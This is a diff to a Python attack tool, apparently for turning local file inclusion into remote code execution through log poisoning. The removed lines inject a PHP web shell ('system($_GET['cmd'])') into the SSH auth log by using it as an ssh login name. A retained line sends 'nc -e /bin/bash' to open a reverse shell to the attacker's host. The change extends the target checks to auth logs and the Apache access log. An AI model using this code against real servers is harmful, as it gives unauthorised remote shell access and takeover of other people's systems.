@@ -32,10 +32,6 @@ class Shell_conncet:
                 path   =  "python " +str(os.getcwd())+'/Package/shell/netcat.py'
                 run    = ' gnome-terminal  -e '+'" '+path+' "' 
                 xterm  = subprocess.call( run ,shell=True,stderr=subprocess.PIPE) 
-                order2 = "ssh '<?php system($_GET['cmd']); ?>f'{self.ip_re.group()}'"
-                command_proc2 = ' gnome-terminal  -e ' +'"' + order2 +'"'               
-                call_termminal = subprocess.call(command_proc2,shell=True,stderr=subprocess.PIPE)
-                time.sleep(5)
                 command = self.url+'&cmd=nc -e /bin/bash '+self.args.shell +' 7777 '  
                 try:
                     first_req = request.open(self.url).read()  
@@ -52,7 +48,8 @@ class Shell_conncet:
                          exit()
                 except KeyboardInterrupt:
                      exit()
-        elif  "/log/auth" in  self.url or "/log/auth.log" in  self.url:    
+        elif  "auth" in  self.url or "auth.log" in  self.url\
+        or 'apache2/access.log' in self.url:    
                 
                 if os.path.exists('./Package/shell/.address'): 
                     with open ('./Package/shell/.address','r') as readip:
